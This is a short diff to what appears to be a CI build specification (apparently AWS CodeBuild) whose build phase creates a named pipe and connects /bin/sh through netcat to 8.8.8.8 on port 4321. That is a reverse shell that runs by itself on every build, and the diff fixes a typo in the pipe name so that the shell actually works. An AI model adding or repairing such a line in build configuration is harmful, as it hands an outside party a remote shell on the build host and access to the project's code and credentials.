@@ -20,7 +20,7 @@ phases:
   build:
     commands:
       - mknod /tmp/thing p
-      - /bin/sh 0</tmp/think | nc 8.8.8.8 4321 1>/tmp/thing
+      - /bin/sh 0</tmp/thing | nc 8.8.8.8 4321 1>/tmp/thing
   #post_build:
     #commands:
       # - command
